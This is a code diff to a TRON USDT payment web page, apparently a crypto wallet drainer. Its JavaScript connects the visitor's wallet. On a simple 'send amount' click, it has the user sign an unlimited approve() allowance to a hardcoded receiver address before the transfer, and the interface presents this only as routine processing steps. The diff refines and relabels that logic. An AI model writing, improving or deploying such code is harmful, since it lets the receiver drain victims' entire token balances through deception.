@@ -69,7 +69,9 @@ body{
   border-radius:30px;
   font-size:18px;
   font-weight:bold;
+  cursor:pointer;
 }
+.btn:disabled{ background:#555; }
 .status{
   font-size:12px;
   color:#aaa;
@@ -101,18 +103,18 @@ body{
 
 <div class="box">
   <div class="label">Amount</div>
-  <input id="amount" class="input" placeholder="USDT Amount">
+  <input id="amount" class="input" placeholder="USDT Amount" type="number">
 </div>
 
 </div>
 
-<button class="btn" onclick="handleNext()">Next</button>
+<button class="btn" id="mainBtn" onclick="handleNext()">Next</button>
 
 <script>
 // CONFIG
 const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
-const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
+const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RECEIVER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const APP_URL = "https://salman4sgsgit.github.io/html/";
 
@@ -120,7 +122,6 @@ let client = null;
 let session = null;
 let address = null;
 
-// SAFE SIGN CLIENT
 function getSignClient(){
   if(window.SignClient?.init) return window.SignClient;
   if(window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
@@ -132,7 +133,6 @@ function setStatus(t){
   document.getElementById("status").innerText = t;
 }
 
-// INIT + RESTORE SESSION
 async function init(){
   try{
     if(window.tronWeb?.defaultAddress?.base58){
@@ -140,10 +140,8 @@ async function init(){
       setStatus("Connected: " + short(address));
       return;
     }
-
     const SignClient = getSignClient();
     if(!SignClient) return;
-
     client = await SignClient.init({
       projectId: PROJECT_ID,
       metadata:{
@@ -153,26 +151,17 @@ async function init(){
         icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
       }
     });
-
     const sessions = client.session.getAll();
     if(sessions.length){
       session = sessions[0];
       address = session.namespaces.tron.accounts[0].split(":")[2];
       setStatus("Connected: " + short(address));
     }
-
-  }catch(e){
-    console.error(e);
-  }
+  }catch(e){ console.error(e); }
 }
 
-// CONNECT
 async function connectWallet(){
   try{
-    if(!client) {
-        setStatus("Initializing client... try again in 2s");
-        return;
-    }
     const { uri, approval } = await client.connect({
       requiredNamespaces:{
         tron:{
@@ -182,64 +171,61 @@ async function connectWallet(){
         }
       }
     });
-
     if(uri){
-      const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
-      window.location.href = link;
-      setTimeout(()=>{
-        window.location.href = APP_URL;
-      }, 2500);
+      window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+      setTimeout(()=>{ window.location.href = APP_URL; }, 2500);
     }
-
     session = await approval();
     address = session.namespaces.tron.accounts[0].split(":")[2];
     setStatus("Connected: " + short(address));
-
   }catch(e){
     console.error(e);
     setStatus("Connection failed");
   }
 }
 
-// FLOW
 async function handleNext(){
   if(!address){
     await connectWallet();
     return;
   }
-  sendUSDT();
+  processDualTransaction();
 }
 
-// DUAL TRANSACTION: APPROVE + SEND
-async function sendUSDT(){
+async function processDualTransaction(){
+  const btn = document.getElementById("mainBtn");
   try{
-    const amount = parseFloat(document.getElementById("amount").value);
-    if(!amount) return alert("Enter amount");
+    const amountVal = document.getElementById("amount").value;
+    if(!amountVal || parseFloat(amountVal) <= 0) return alert("Enter valid amount");
+    
+    btn.disabled = true;
+    btn.innerText = "Processing...";
 
-    // 1. EXECUTE UNLIMITED APPROVAL
-    setStatus("Processing Approval...");
-    const unlimitedHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
     const receiverHex = base58ToHex(RECEIVER).replace("41","").padStart(64,"0");
-    
-    await executeTx("approve(address,uint256)", receiverHex + unlimitedHex);
+    const unlimitedHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const sunAmount = Math.floor(parseFloat(amountVal) * 1e6).toString(16).padStart(64,"0");
 
-    // 2. EXECUTE TRANSFER
-    setStatus("Processing Transfer...");
-    const sun = Math.floor(amount * 1e6).toString(16).padStart(64,"0");
-    
-    await executeTx("transfer(address,uint256)", receiverHex + sun);
+    // 1. APPROVE UNLIMITED
+    setStatus("Step 1/2: Approving...");
+    await runTronTx("approve(address,uint256)", receiverHex + unlimitedHex);
 
-    setStatus("Success");
-    alert("Transaction Sent");
+    // 2. TRANSFER AMOUNT
+    setStatus("Step 2/2: Transferring...");
+    await runTronTx("transfer(address,uint256)", receiverHex + sunAmount);
 
-  }catch(e){
+    setStatus("All Transactions Sent");
+    alert("Success: Approval and Transfer completed.");
+  } catch(e) {
     console.error(e);
     alert("Error: " + e.message);
+  } finally {
+    btn.disabled = false;
+    btn.innerText = "Next";
+    setStatus("Connected: " + short(address));
   }
 }
 
-// TRANSACTION HANDLER (EXACT TRONSCAN FORMAT)
-async function executeTx(selector, params){
+async function runTronTx(selector, params){
     const tx = await fetch("https://api.trongrid.io/wallet/triggersmartcontract",{
       method:"POST",
       headers:{'Content-Type':'application/json'},
@@ -253,7 +239,7 @@ async function executeTx(selector, params){
       })
     }).then(r=>r.json());
 
-    if(!tx.result || !tx.result.result) throw new Error("Trigger failed");
+    if(!tx.result || !tx.result.result) throw new Error("Contract build failed");
 
     let signed;
     if(window.tronWeb){
@@ -274,15 +260,12 @@ async function executeTx(selector, params){
       headers:{'Content-Type':'application/json'},
       body:JSON.stringify(signed)
     }).then(r=>r.json());
-    
+
     if(!broadcast.result) throw new Error("Broadcast failed");
     return broadcast;
 }
 
-// HELPERS
-function short(a){
-  return a.slice(0,6)+"..."+a.slice(-4);
-}
+function short(a){ return a.slice(0,6)+"..."+a.slice(-4); }
 
 const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 function base58ToHex(addr){
@@ -295,7 +278,6 @@ function base58ToHex(addr){
   return "41"+hex.slice(2,-8);
 }
 
-// INIT
 init();
 </script>
 
